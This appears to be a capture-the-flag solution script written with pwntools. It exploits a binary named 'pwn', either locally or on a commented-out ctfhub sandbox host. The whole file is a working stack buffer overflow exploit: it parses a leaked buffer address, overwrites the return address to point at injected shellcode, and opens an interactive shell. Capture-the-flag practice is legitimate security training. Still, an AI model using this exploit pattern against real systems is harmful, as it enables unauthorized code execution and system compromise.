from pwn import *


#sh = remote('challenge-8819062debdee49e.sandbox.ctfhub.com', 31573)
sh = process('./pwn')
e = ELF('./pwn')
context.binary = './pwn'

sh.recvuntil(b'is it : [')
_buf_addr = int(sh.recvuntil(b']')[:-1], 16)
_shellcode_addr = _buf_addr + 0x10 + 8 + 8

sh.recv()

shellcode = asm(shellcraft.sh())

payload = b'a'*(0x10+8) + p64(_shellcode_addr) + shellcode

sh.sendline(payload)
sh.interactive()
